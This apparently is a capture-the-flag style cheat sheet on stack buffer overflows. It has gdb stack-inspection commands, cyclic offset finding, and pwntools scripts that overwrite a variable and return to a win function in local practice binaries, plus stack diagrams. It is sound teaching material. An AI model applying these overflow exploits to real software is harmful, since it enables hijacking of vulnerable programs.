# Buffer Overflow

## Variable Overwrite
Identifying offset to overwrite variable

Listing Stack
By listing stack we can identify where our input is (for example `0x41414141`).
```
(gdb) x/100xw $esp
(gdb) x/100xg $rsp
```

Examining Base Pointer and Variable to Overwrite
```
(gdb) x/xw $ebp
(gdb) x/xg $rbp

(gdb) x/xw $ebp-0xc
(gdb) x/xg $rbp-0xc
```
We can find the printed address on the stack.

Exploit for variable overwrite
```
from pwn import *

elf = context.binary = ELF("./vuln", checksec=False)
p = process(["./vuln"])

payload = b"A" * 32 # set offset here
payload += p32(0xdeadbeef) #p64() for x64

p.sendline(payload)
p.interactive()
```


## Return Pointer(EIP/RIP) Overwrite with Parameters

Locating offset to reach the return pointer
```
cyclic 100
cyclic -l faaa
```
or you can choose the method used in variable overwrite

How do we find the address of our destination?
If PIE is not enabled
```
objdump -t file
(gdb) info functions
```

Base return to win without parameter
```
from pwn import *

elf = context.binary = ELF("./ret2win", checksec=False)
p = process(["./ret2win"])

offset = 24;
payload = b"A" * offset
payload += b"B" * 4
payload += p32(0x08049182)

p.sendline(payload)
p.interactive()
```

For x86
```
+----------------------------+
|      second parameter      |
+----------------------------+
|      first parameter       |
+----------------------------+
|      stored eip value      |
+----------------------------+
|      stored ebp value      |
+----------------------------+
|AAAAAAAAAAAAAAAAAAAAAAAAAAAA|
+----------------------------+
```

For x64
```
+----------------------------+
|      stored eip value      |
+----------------------------+
|      stored ebp value      |
+----------------------------+
|AAAAAAAAAAAAAAAAAAAAAAAAAAAA|
+----------------------------+
```








